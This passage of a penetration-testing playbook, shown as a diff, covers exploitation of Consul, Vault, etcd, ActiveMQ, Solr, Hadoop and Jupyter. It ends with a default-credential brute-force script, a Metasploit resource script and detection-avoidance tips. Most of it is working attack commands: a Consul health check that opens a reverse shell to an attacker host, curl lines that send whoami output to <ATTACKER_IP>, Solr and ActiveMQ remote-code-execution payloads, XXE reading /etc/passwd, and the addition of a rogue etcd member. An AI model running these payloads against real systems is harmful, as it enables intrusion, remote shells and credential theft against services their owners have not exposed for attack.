+curl http://<TARGET_IP>:8500/v1/catalog/services
+curl http://<TARGET_IP>:8500/v1/catalog/service/<SERVICE_NAME>
+
+# List nodes
+curl http://<TARGET_IP>:8500/v1/catalog/nodes
+
+# KV store enumeration
+curl http://<TARGET_IP>:8500/v1/kv/?recurse
+curl http://<TARGET_IP>:8500/v1/kv/<KEY>
+
+# ACL tokens (if no auth)
+curl http://<TARGET_IP>:8500/v1/acl/tokens
+
+# Agent information
+curl http://<TARGET_IP>:8500/v1/agent/members
+curl http://<TARGET_IP>:8500/v1/agent/services
+
+# Health checks
+curl http://<TARGET_IP>:8500/v1/health/node/<NODE_NAME>
+
+# DNS interface (8600/udp)
+dig @<TARGET_IP> -p 8600 consul.service.consul
+dig @<TARGET_IP> -p 8600 <SERVICE>.service.consul
+
+# Execute commands via health check
+curl -X PUT http://<TARGET_IP>:8500/v1/agent/check/register -d '{
+  "ID": "backdoor",
+  "Name": "Backdoor",
+  "Args": ["/bin/bash", "-c", "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1"],
+  "Interval": "10s"
+}'
+
+# Service registration with script
+curl -X PUT http://<TARGET_IP>:8500/v1/agent/service/register -d '{
+  "ID": "evil",
+  "Name": "evil",
+  "Port": 8080,
+  "Check": {
+    "Script": "curl http://<ATTACKER_IP>/?data=$(whoami)",
+    "Interval": "10s"
+  }
+}'
+
+# Consul exec (if enabled)
+consul exec -http-addr=http://<TARGET_IP>:8500 -datacenter=<DC> "id"
+
+# Snapshot exploitation (backup)
+curl http://<TARGET_IP>:8500/v1/snapshot -o consul_backup.snap
+
+# Connect proxy exploitation
+curl http://<TARGET_IP>:8500/v1/agent/connect/proxy/<SERVICE_NAME>
+
+# Raft peer manipulation
+curl http://<TARGET_IP>:8500/v1/status/peers
+
+# Metasploit module
+msfconsole -x "use exploit/multi/misc/consul_rce; set RHOSTS <TARGET_IP>; run"
+```
+
+**Pitfalls:**
+- ACLs properly configured
+- Script checks disabled
+- TLS encryption required
+- Network segmentation
+- Audit logging enabled
+
+**Cleanup Steps:**
+```bash
+# Deregister services
+curl -X PUT http://<TARGET_IP>:8500/v1/agent/service/deregister/evil
+# Remove checks
+curl -X PUT http://<TARGET_IP>:8500/v1/agent/check/deregister/backdoor
+```
+
+**Suggested Findings:**
+- Consul API without ACLs
+- Script checks enabled
+- Sensitive data in KV store
+- Service registration allowed
+- No encryption enabled
+
+**Conditions When to Try:**
+- Service mesh present
+- Port 8500/8300/8600 open
+- Microservices architecture
+- Configuration management
+
+---
+
+## 45. HashiCorp Vault Exploitation (8200/tcp)
+
+**Category:** Secrets Management  
+**Description:** Exploit Vault for secret extraction and authentication bypass.
+
+**Tools Required:**
+- vault CLI
+- curl
+- jq
+- custom scripts
+
+**Steps/Commands:**
+```bash
+# Vault enumeration
+curl http://<TARGET_IP>:8200/v1/sys/health
+curl http://<TARGET_IP>:8200/v1/sys/seal-status
+
+# Check initialization
+curl http://<TARGET_IP>:8200/v1/sys/init
+
+# Auth methods
+curl http://<TARGET_IP>:8200/v1/sys/auth
+
+# List secrets engines
+curl -H "X-Vault-Token: <TOKEN>" http://<TARGET_IP>:8200/v1/sys/mounts
+
+# Token authentication
+curl -X POST http://<TARGET_IP>:8200/v1/auth/token/lookup-self -H "X-Vault-Token: <TOKEN>"
+
+# AppRole authentication
+curl -X POST http://<TARGET_IP>:8200/v1/auth/approle/login -d '{
+  "role_id": "<ROLE_ID>",
+  "secret_id": "<SECRET_ID>"
+}'
+
+# LDAP authentication
+curl -X POST http://<TARGET_IP>:8200/v1/auth/ldap/login/<USERNAME> -d '{
+  "password": "<PASSWORD>"
+}'
+
+# List secrets
+curl -H "X-Vault-Token: <TOKEN>" http://<TARGET_IP>:8200/v1/secret/metadata/?list=true
+
+# Read secret
+curl -H "X-Vault-Token: <TOKEN>" http://<TARGET_IP>:8200/v1/secret/data/<PATH>
+
+# AWS credentials
+curl -H "X-Vault-Token: <TOKEN>" http://<TARGET_IP>:8200/v1/aws/creds/<ROLE>
+
+# Database credentials
+curl -H "X-Vault-Token: <TOKEN>" http://<TARGET_IP>:8200/v1/database/creds/<ROLE>
+
+# SSH OTP
+curl -H "X-Vault-Token: <TOKEN>" -X POST http://<TARGET_IP>:8200/v1/ssh/creds/<ROLE> -d '{
+  "ip": "<TARGET_SSH_IP>"
+}'
+
+# Token creation (if permitted)
+curl -H "X-Vault-Token: <TOKEN>" -X POST http://<TARGET_IP>:8200/v1/auth/token/create -d '{
+  "policies": ["root"],
+  "ttl": "768h"
+}'
+
+# Audit log bypass
+curl -H "X-Vault-Token: <TOKEN>" http://<TARGET_IP>:8200/v1/sys/audit
+
+# Unsealing Vault (if sealed)
+curl -X PUT http://<TARGET_IP>:8200/v1/sys/unseal -d '{
+  "key": "<UNSEAL_KEY>"
+}'
+
+# Policy enumeration
+curl -H "X-Vault-Token: <TOKEN>" http://<TARGET_IP>:8200/v1/sys/policies/acl?list=true
+```
+
+**Pitfalls:**
+- Strong authentication required
+- Vault sealed state
+- Policy restrictions
+- Audit logging everything
+- Token TTL limits
+
+**Cleanup Steps:**
+```bash
+# Revoke created tokens
+curl -H "X-Vault-Token: <TOKEN>" -X POST http://<TARGET_IP>:8200/v1/auth/token/revoke -d '{
+  "token": "<TOKEN_TO_REVOKE>"
+}'
+```
+
+**Suggested Findings:**
+- Vault unsealed publicly
+- Weak authentication methods
+- Overly permissive policies
+- Sensitive secrets exposed
+- No audit logging
+
+**Conditions When to Try:**
+- Secrets management present
+- Port 8200 open
+- DevOps environment
+- Cloud infrastructure
+
+---
+
+## 46. etcd Service Exploitation (2379/tcp, 2380/tcp)
+
+**Category:** Distributed Key-Value Store  
+**Description:** Exploit etcd for configuration extraction and cluster manipulation.
+
+**Tools Required:**
+- etcdctl
+- curl
+- jq
+
+**Steps/Commands:**
+```bash
+# etcd v2 API
+curl http://<TARGET_IP>:2379/version
+curl http://<TARGET_IP>:2379/v2/keys/?recursive=true
+
+# etcd v3 API
+curl http://<TARGET_IP>:2379/v3/kv/range -X POST -d '{"key": "AA==", "range_end": "AA=="}'
+
+# List all keys (v2)
+curl http://<TARGET_IP>:2379/v2/keys?recursive=true
+
+# Get specific key (v2)
+curl http://<TARGET_IP>:2379/v2/keys/<KEY_PATH>
+
+# Set key (v2)
+curl -X PUT http://<TARGET_IP>:2379/v2/keys/<KEY_PATH> -d value="<VALUE>"
+
+# Member list
+curl http://<TARGET_IP>:2379/v2/members
+
+# Stats
+curl http://<TARGET_IP>:2379/v2/stats/leader
+curl http://<TARGET_IP>:2379/v2/stats/self
+curl http://<TARGET_IP>:2379/v2/stats/store
+
+# Using etcdctl v3
+etcdctl --endpoints=http://<TARGET_IP>:2379 get "" --prefix --keys-only
+etcdctl --endpoints=http://<TARGET_IP>:2379 get "" --prefix
+
+# Authentication check
+etcdctl --endpoints=http://<TARGET_IP>:2379 user list
+etcdctl --endpoints=http://<TARGET_IP>:2379 auth status
+
+# Kubernetes secrets (if k8s backend)
+curl http://<TARGET_IP>:2379/v2/keys/registry/secrets/default?recursive=true
+
+# Service accounts
+curl http://<TARGET_IP>:2379/v2/keys/registry/serviceaccounts/default?recursive=true
+
+# Create snapshot (backup)
+etcdctl --endpoints=http://<TARGET_IP>:2379 snapshot save backup.db
+
+# Watch for changes
+curl http://<TARGET_IP>:2379/v2/keys/<KEY_PATH>?wait=true&recursive=true
+
+# Delete key
+curl -X DELETE http://<TARGET_IP>:2379/v2/keys/<KEY_PATH>
+
+# Cluster health
+etcdctl --endpoints=http://<TARGET_IP>:2379 cluster-health
+
+# Add malicious member (if no auth)
+curl -X POST http://<TARGET_IP>:2379/v2/members -d '{
+  "peerURLs": ["http://<ATTACKER_IP>:2380"]
+}'
+```
+
+**Pitfalls:**
+- Authentication enabled
+- TLS required
+- RBAC configured
+- Network isolation
+- Audit logging
+
+**Cleanup Steps:**
+```bash
+# Remove added keys
+curl -X DELETE http://<TARGET_IP>:2379/v2/keys/<TEST_KEY>
+# Remove malicious members
+curl -X DELETE http://<TARGET_IP>:2379/v2/members/<MEMBER_ID>
+```
+
+**Suggested Findings:**
+- etcd exposed without auth
+- Kubernetes secrets in etcd
+- No TLS encryption
+- Configuration data exposed
+- Cluster manipulation possible
+
+**Conditions When to Try:**
+- Kubernetes backend
+- Port 2379/2380 open
+- Distributed systems
+- Configuration storage
+
+---
+
+## 47. Apache ActiveMQ Exploitation (61616/tcp, 8161/tcp)
+
+**Category:** Message Broker Services  
+**Description:** Exploit ActiveMQ for unauthorized access and remote code execution.
+
+**Tools Required:**
+- curl
+- activemq-cli
+- metasploit
+- jmxterm
+
+**Steps/Commands:**
+```bash
+# Web console (8161/tcp)
+curl http://<TARGET_IP>:8161/admin/
+# Default: admin/admin
+
+# Version detection
+curl http://<TARGET_IP>:8161/admin/index.jsp | grep -i version
+
+# Queue enumeration
+curl -u admin:admin http://<TARGET_IP>:8161/admin/queues.jsp
+curl -u admin:admin http://<TARGET_IP>:8161/admin/topics.jsp
+
+# Send message to queue
+curl -u admin:admin -X POST http://<TARGET_IP>:8161/admin/sendMessage.action -d "JMSDestination=<QUEUE_NAME>&JMSText=<MESSAGE>"
+
+# CVE-2015-5254 (Deserialization)
+# Upload JAR via PUT
+curl -X PUT --data-binary @evil.jar http://<TARGET_IP>:8161/fileserver/evil.jar
+
+# CVE-2016-3088 (RCE via fileserver)
+curl -X PUT http://<TARGET_IP>:8161/fileserver/test.jsp --data '<%@ page import="java.io.*" %><% Process p = Runtime.getRuntime().exec("id"); %>'
+curl http://<TARGET_IP>:8161/fileserver/test.jsp
+
+# JMX exploitation (if exposed)
+java -jar jmxterm.jar --url <TARGET_IP>:1099
+> bean org.apache.activemq:type=Broker,brokerName=localhost
+> run stop
+
+# STOMP protocol (61613/tcp)
+telnet <TARGET_IP> 61613
+CONNECT
+
+^@
+
+SEND
+destination:/queue/test
+content-length:11
+
+Test Message
+^@
+
+# OpenWire protocol (61616/tcp)
+# Complex binary protocol, use metasploit
+
+# API endpoints
+curl -u admin:admin http://<TARGET_IP>:8161/api/message/<QUEUE_NAME>?type=queue
+curl -u admin:admin http://<TARGET_IP>:8161/api/jolokia/
+
+# Scheduled message exploitation
+curl -u admin:admin -X POST http://<TARGET_IP>:8161/admin/sendMessage.action \
+  -d "JMSDestination=<QUEUE>&AMQ_SCHEDULED_DELAY=60000&JMSText=<MESSAGE>"
+
+# Metasploit modules
+msfconsole -x "use exploit/multi/http/activemq_upload_jsp; set RHOSTS <TARGET_IP>; run"
+```
+
+**Pitfalls:**
+- Authentication required
+- Fileserver disabled
+- Network isolation
+- Message encryption
+- Audit logging enabled
+
+**Cleanup Steps:**
+```bash
+# Remove uploaded files
+curl -X DELETE http://<TARGET_IP>:8161/fileserver/evil.jar
+# Purge test queues
+curl -u admin:admin -X POST http://<TARGET_IP>:8161/admin/purgeQueue.action?JMSDestination=<QUEUE_NAME>
+```
+
+**Suggested Findings:**
+- Default ActiveMQ credentials
+- Fileserver upload enabled
+- Deserialization vulnerability
+- JMX exposed
+- No message encryption
+
+**Conditions When to Try:**
+- Message broker present
+- Port 61616/8161 open
+- Java environment
+- Enterprise messaging
+
+---
+
+## 48. Apache Solr Exploitation (8983/tcp)
+
+**Category:** Search Platform Services  
+**Description:** Exploit Apache Solr for information disclosure and remote code execution.
+
+**Tools Required:**
+- curl
+- solr-cli
+- metasploit
+- python
+
+**Steps/Commands:**
+```bash
+# Solr admin interface
+curl http://<TARGET_IP>:8983/solr/
+curl http://<TARGET_IP>:8983/solr/admin/info/system
+
+# List cores
+curl http://<TARGET_IP>:8983/solr/admin/cores?action=STATUS
+
+# Schema information
+curl http://<TARGET_IP>:8983/solr/<CORE_NAME>/schema
+
+# Query data
+curl "http://<TARGET_IP>:8983/solr/<CORE_NAME>/select?q=*:*"
+curl "http://<TARGET_IP>:8983/solr/<CORE_NAME>/select?q=*:*&rows=10000"
+
+# Config API
+curl http://<TARGET_IP>:8983/solr/<CORE_NAME>/config
+
+# CVE-2019-0193 (RCE via DataImportHandler)
+curl -X POST http://<TARGET_IP>:8983/solr/<CORE_NAME>/dataimport -d "command=full-import&dataConfig=<dataConfig><script><![CDATA[java.lang.Runtime.getRuntime().exec('id');]]></script></dataConfig>"
+
+# CVE-2019-17558 (RCE via VelocityResponseWriter)
+curl "http://<TARGET_IP>:8983/solr/<CORE_NAME>/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
+
+# XXE via update handler
+curl -X POST http://<TARGET_IP>:8983/solr/<CORE_NAME>/update -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><add><doc><field name="id">&xxe;</field></doc></add>'
+
+# Local file inclusion
+curl "http://<TARGET_IP>:8983/solr/<CORE_NAME>/select?q=*:*&wt=xslt&tr=../../../../etc/passwd"
+
+# Admin API authentication bypass
+curl http://<TARGET_IP>:8983/solr/admin/collections?action=LIST
+
+# Create malicious configset
+curl -X POST http://<TARGET_IP>:8983/solr/admin/configs -d "action=CREATE&name=evil&baseConfigSet=_default"
+
+# Stream handler RCE
+curl -X POST http://<TARGET_IP>:8983/solr/<CORE_NAME>/stream -d 'expr=runExecutable("/bin/bash","-c","curl http://<ATTACKER_IP>/?data=$(whoami)")'
+
+# Backup/Restore exploitation
+curl "http://<TARGET_IP>:8983/solr/<CORE_NAME>/replication?command=backup&location=/etc/"
+
+# Debug endpoints
+curl http://<TARGET_IP>:8983/solr/<CORE_NAME>/debug/dump
+
+# Metasploit modules
+msfconsole -x "use exploit/multi/http/solr_velocity_rce; set RHOSTS <TARGET_IP>; set TARGETURI /solr/<CORE_NAME>; run"
+```
+
+**Pitfalls:**
+- Authentication enabled
+- Disabled handlers
+- Network segmentation
+- Input validation
+- Newer versions patched
+
+**Cleanup Steps:**
+```bash
+# Delete test documents
+curl -X POST http://<TARGET_IP>:8983/solr/<CORE_NAME>/update -H "Content-Type: text/xml" -d '<delete><query>*:*</query></delete>'
+# Remove configsets
+curl -X POST http://<TARGET_IP>:8983/solr/admin/configs -d "action=DELETE&name=evil"
+```
+
+**Suggested Findings:**
+- Solr admin exposed
+- RCE vulnerabilities present
+- XXE vulnerability
+- No authentication required
+- Sensitive data indexed
+
+**Conditions When to Try:**
+- Search platform identified
+- Port 8983 open
+- Big data environment
+- Document management systems
+
+---
+
+## 49. Hadoop/HDFS Exploitation (50070/tcp, 8088/tcp, 9000/tcp)
+
+**Category:** Big Data Services  
+**Description:** Exploit Hadoop ecosystem for unauthorized data access and job execution.
+
+**Tools Required:**
+- hdfs CLI
+- yarn CLI
+- curl
+- hadoop-exploit
+
+**Steps/Commands:**
+```bash
+# NameNode Web UI (50070/tcp or 9870/tcp)
+curl http://<TARGET_IP>:50070/dfshealth.html
+curl http://<TARGET_IP>:50070/explorer.html
+
+# YARN ResourceManager (8088/tcp)
+curl http://<TARGET_IP>:8088/cluster
+curl http://<TARGET_IP>:8088/ws/v1/cluster/info
+
+# List files via WebHDFS
+curl "http://<TARGET_IP>:50070/webhdfs/v1/?op=LISTSTATUS"
+curl "http://<TARGET_IP>:50070/webhdfs/v1/<PATH>?op=LISTSTATUS"
+
+# Read file via WebHDFS
+curl -L "http://<TARGET_IP>:50070/webhdfs/v1/<FILE_PATH>?op=OPEN"
+
+# Create file via WebHDFS
+curl -X PUT "http://<TARGET_IP>:50070/webhdfs/v1/<FILE_PATH>?op=CREATE"
+curl -X PUT -T <LOCAL_FILE> "http://<TARGET_IP>:50070/webhdfs/v1/<FILE_PATH>?op=CREATE&overwrite=true"
+
+# Submit YARN application
+curl -X POST http://<TARGET_IP>:8088/ws/v1/cluster/apps/new-application
+curl -X POST http://<TARGET_IP>:8088/ws/v1/cluster/apps -H "Content-Type: application/json" -d @app.json
+
+# Native HDFS protocol (9000/tcp)
+hdfs dfs -ls hdfs://<TARGET_IP>:9000/
+hdfs dfs -cat hdfs://<TARGET_IP>:9000/<FILE_PATH>
+
+# Download entire directory
+hdfs dfs -get hdfs://<TARGET_IP>:9000/<DIRECTORY> <LOCAL_DIR>
+
+# Job history server
+curl http://<TARGET_IP>:19888/jobhistory
+
+# DataNode info (50075/tcp)
+curl http://<TARGET_IP>:50075/dataNodeInfo
+
+# Execute MapReduce job
+hadoop jar /usr/lib/hadoop-mapreduce/hadoop-mapreduce-examples.jar pi 10 100
+
+# Kerberos bypass attempts
+export HADOOP_USER_NAME=hdfs
+hdfs dfs -ls /
+
+# Hive server (10000/tcp)
+beeline -u jdbc:hive2://<TARGET_IP>:10000 -n <USER>
+
+# Spark UI (4040/tcp)
+curl http://<TARGET_IP>:4040/api/v1/applications
+
+# HBase (16010/tcp)
+curl http://<TARGET_IP>:16010/master-status
+
+# Check for sensitive data
+curl -L "http://<TARGET_IP>:50070/webhdfs/v1/user?op=LISTSTATUS" | grep -i "password\|secret\|key\|token"
+```
+
+**Pitfalls:**
+- Kerberos authentication
+- Ranger/Sentry authorization
+- Network isolation
+- Encryption enabled
+- Audit logging
+
+**Cleanup Steps:**
+```bash
+# Delete uploaded files
+curl -X DELETE "http://<TARGET_IP>:50070/webhdfs/v1/<FILE_PATH>?op=DELETE"
+hdfs dfs -rm -r hdfs://<TARGET_IP>:9000/<TEST_DIR>
+```
+
+**Suggested Findings:**
+- Hadoop services exposed
+- No authentication required
+- Sensitive data in HDFS
+- Job execution possible
+- WebHDFS enabled
+
+**Conditions When to Try:**
+- Big data infrastructure
+- Port 50070/8088/9000 open
+- Data lake environment
+- Analytics platform
+
+---
+
+## 50. Jupyter Notebook Exploitation (8888/tcp)
+
+**Category:** Data Science/Development  
+**Description:** Exploit Jupyter Notebooks for code execution and data access.
+
+**Tools Required:**
+- curl
+- browser
+- python
+- jupyter client
+
+**Steps/Commands:**
+```bash
+# Jupyter interface
+curl http://<TARGET_IP>:8888/api
+curl http://<TARGET_IP>:8888/api/contents
+
+# Check for password/token
+curl http://<TARGET_IP>:8888/login
+
+# List running notebooks
+curl http://<TARGET_IP>:8888/api/sessions
+
+# Get notebook content
+curl http://<TARGET_IP>:8888/api/contents/<PATH>
+
+# Execute code via API (if token known)
+curl -X POST http://<TARGET_IP>:8888/api/sessions -H "Authorization: token <TOKEN>" -H "Content-Type: application/json" -d '{
+  "kernel": {"name": "python3"},
+  "name": "evil.ipynb",
+  "path": "/"
+}'
+
+# Create new notebook
+curl -X PUT http://<TARGET_IP>:8888/api/contents/evil.ipynb -H "Authorization: token <TOKEN>" -H "Content-Type: application/json" -d '{
+  "type": "notebook",
+  "content": {
+    "cells": [{
+      "cell_type": "code",
+      "source": "import os; os.system(\"id\")"
+    }]
+  }
+}'
+
+# Terminal access (if enabled)
+curl http://<TARGET_IP>:8888/terminals/1
+
+# Kernel execution
+curl -X POST http://<TARGET_IP>:8888/api/kernels -H "Authorization: token <TOKEN>" -H "Content-Type: application/json" -d '{"name": "python3"}'
+
+# Execute code in kernel
+curl -X POST http://<TARGET_IP>:8888/api/kernels/<KERNEL_ID>/execute -H "Authorization: token <TOKEN>" -H "Content-Type: application/json" -d '{
+  "code": "!cat /etc/passwd"
+}'
+
+# Get server info
+curl http://<TARGET_IP>:8888/api/status
+
+# List available kernelspecs
+curl http://<TARGET_IP>:8888/api/kernelspecs
+
+# Token extraction from process
+# If you have local access
+ps aux | grep jupyter
+jupyter notebook list
+
+# Config file locations
+# ~/.jupyter/jupyter_notebook_config.py
+# /etc/jupyter/jupyter_notebook_config.py
+
+# Bypass token with debug mode
+curl http://<TARGET_IP>:8888/?token=<PARTIAL_TOKEN>
+
+# JupyterHub (if present)
+curl http://<TARGET_IP>:8000/hub/api
+```
+
+**Pitfalls:**
+- Token authentication required
+- Network binding to localhost
+- JupyterHub authentication
+- SSL/TLS enabled
+- Read-only notebooks
+
+**Cleanup Steps:**
+```bash
+# Delete created notebooks
+curl -X DELETE http://<TARGET_IP>:8888/api/contents/evil.ipynb -H "Authorization: token <TOKEN>"
+# Shutdown kernels
+curl -X DELETE http://<TARGET_IP>:8888/api/kernels/<KERNEL_ID> -H "Authorization: token <TOKEN>"
+```
+
+**Suggested Findings:**
+- Jupyter without authentication
+- Weak or no token
+- Terminal access enabled
+- Sensitive data in notebooks
+- Code execution possible
+
+**Conditions When to Try:**
+- Data science environment
+- Port 8888 open
+- Research infrastructure
+- Development environment
+
+---
+
+## Final Notes
+
+### Service Enumeration Strategy
+1. Start with comprehensive port scan
+2. **Test default credentials FIRST** - quickest win
+3. Identify service versions
+4. Check for known vulnerabilities
+5. Attempt authenticated enumeration
+6. Document all findings
+
+### Automated Default Credential Testing
+
+**Multi-Service Default Credential Scanner Script:**
+```bash
+#!/bin/bash
+# Comprehensive default credential tester
+# Usage: ./default_cred_test.sh <TARGET_IP>
+
+TARGET="$1"
+FOUND_CREDS="found_credentials.txt"
+
+echo "[*] Starting default credential scan for $TARGET"
+echo "[*] Results will be saved to $FOUND_CREDS"
+echo "" > $FOUND_CREDS
+
+# SSH (22)
+if nc -zv $TARGET 22 2>/dev/null | grep -q succeeded; then
+    echo "[+] Testing SSH defaults..."
+    for user in root admin pi ubuntu; do
+        for pass in root admin password toor raspberry ubuntu; do
+            timeout 3 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$user@$TARGET" "exit" 2>/dev/null && \
+                echo "[!] SSH: $user:$pass" | tee -a $FOUND_CREDS
+        done
+    done
+fi
+
+# FTP (21)
+if nc -zv $TARGET 21 2>/dev/null | grep -q succeeded; then
+    echo "[+] Testing FTP defaults..."
+    for user in anonymous admin ftp root; do
+        for pass in anonymous admin ftp password; do
+            echo -e "USER $user\nPASS $pass\nQUIT" | timeout 3 nc $TARGET 21 2>/dev/null | grep -q "230" && \
+                echo "[!] FTP: $user:$pass" | tee -a $FOUND_CREDS
+        done
+    done
+fi
+
+# MySQL (3306)
+if nc -zv $TARGET 3306 2>/dev/null | grep -q succeeded; then
+    echo "[+] Testing MySQL defaults..."
+    for user in root mysql admin; do
+        for pass in "" root password mysql admin; do
+            timeout 3 mysql -h $TARGET -u $user -p"$pass" -e "SELECT 1" 2>/dev/null && \
+                echo "[!] MySQL: $user:$pass" | tee -a $FOUND_CREDS
+        done
+    done
+fi
+
+# PostgreSQL (5432)
+if nc -zv $TARGET 5432 2>/dev/null | grep -q succeeded; then
+    echo "[+] Testing PostgreSQL defaults..."
+    for user in postgres admin; do
+        for pass in postgres password admin; do
+            PGPASSWORD="$pass" timeout 3 psql -h $TARGET -U $user -c "SELECT 1" 2>/dev/null && \
+                echo "[!] PostgreSQL: $user:$pass" | tee -a $FOUND_CREDS
+        done
+    done
+fi
+
+# SMB (445)
+if nc -zv $TARGET 445 2>/dev/null | grep -q succeeded; then
+    echo "[+] Testing SMB defaults..."
+    for user in Administrator admin Guest; do
+        for pass in "" password admin Password1; do
+            timeout 3 smbclient -L $TARGET -U "$user%$pass" 2>/dev/null | grep -q "Disk" && \
+                echo "[!] SMB: $user:$pass" | tee -a $FOUND_CREDS
+        done
+    done
+fi
+
+# Tomcat (8080)
+if nc -zv $TARGET 8080 2>/dev/null | grep -q succeeded; then
+    echo "[+] Testing Tomcat defaults..."
+    for cred in "tomcat:tomcat" "admin:admin" "manager:manager" "tomcat:s3cret"; do
+        user="${cred%%:*}"
+        pass="${cred#*:}"
+        curl -sf -u "$user:$pass" http://$TARGET:8080/manager/html 2>/dev/null | grep -q "Tomcat Web Application Manager" && \
+            echo "[!] Tomcat: $user:$pass" | tee -a $FOUND_CREDS
+    done
+fi
+
+# Redis (6379)
+if nc -zv $TARGET 6379 2>/dev/null | grep -q succeeded; then
+    echo "[+] Testing Redis..."
+    echo "INFO" | timeout 3 nc $TARGET 6379 2>/dev/null | grep -q "redis_version" && \
+        echo "[!] Redis: No authentication required" | tee -a $FOUND_CREDS
+fi
+
+# MongoDB (27017)
+if nc -zv $TARGET 27017 2>/dev/null | grep -q succeeded; then
+    echo "[+] Testing MongoDB..."
+    timeout 3 mongo --host $TARGET --eval "db.version()" 2>/dev/null | grep -q "MongoDB" && \
+        echo "[!] MongoDB: No authentication required" | tee -a $FOUND_CREDS
+fi
+
+echo "[*] Default credential scan complete. Check $FOUND_CREDS for results."
+```
+
+**Using Metasploit for Default Credentials:**
+```ruby
+# Create resource script for MSF
+cat > default_creds.rc << 'EOF'
+# Default credential testing resource script
+setg RHOSTS <TARGET_IP>
+setg THREADS 10
+
+# SSH
+use auxiliary/scanner/ssh/ssh_login
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+run
+back
+
+# SMB
+use auxiliary/scanner/smb/smb_login
+set SMBUser Administrator
+set SMBPass ""
+run
+set SMBPass password
+run
+back
+
+# MySQL
+use auxiliary/scanner/mysql/mysql_login
+set USERNAME root
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+run
+back
+
+# PostgreSQL
+use auxiliary/scanner/postgres/postgres_login
+set USERNAME postgres
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+run
+back
+
+# Tomcat
+use auxiliary/scanner/http/tomcat_mgr_login
+set RPORT 8080
+run
+back
+EOF
+
+# Run with: msfconsole -r default_creds.rc
+```
+
+### Common Credential Lists
+- `/usr/share/wordlists/metasploit/default_users_for_services_unhash.txt`
+- `/usr/share/seclists/Passwords/Default-Credentials/`
+- `/usr/share/seclists/Usernames/top-usernames-shortlist.txt`
+- `/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt`
+- `/usr/share/wordlists/rockyou.txt`
+
+### Detection Avoidance
+- Use timing options (-T2 or lower in nmap)
+- Randomize target order
+- Limit concurrent connections
+- Use proxychains/tor for anonymity
+- Fragment packets when possible
+- **Test defaults first** - less noise than brute force
+
+### Legal Considerations
+- Only test services you're authorized to assess
+- Avoid service disruption
+- Don't access private data unnecessarily
+- Report critical findings immediately
+- Maintain detailed logs of all activities
+- **Document all default credentials found**
+
+### Post-Exploitation Next Steps
+1. Change all default credentials found
+2. Establish persistence if authorized
+3. Perform privilege escalation
+4. Lateral movement to other systems
+5. Data identification and classification
+6. Document attack paths
+
+### Reporting Template for Default Credentials
+```markdown
+## Finding: Default Credentials
+
+**Severity:** Critical/High
+**Service:** [Service Name]
+**Port:** [Port Number]
+**Credentials Found:** [username:password]
+
+### Impact
+An attacker can gain unauthorized access to [service] using default credentials,
+potentially leading to [specific impact].
+
+### Reproduction Steps
+1. Connect to [service] on port [port]
+2. Authenticate using credentials: [username:password]
+3. Access granted to [what level of access]
+
+### Remediation
+1. Immediately change default credentials
+2. Implement strong password policy
+3. Enable account lockout policies
+4. Consider multi-factor authentication
+5. Regular credential audits
+
+### Evidence
+[Screenshot or command output showing successful authentication]
+```
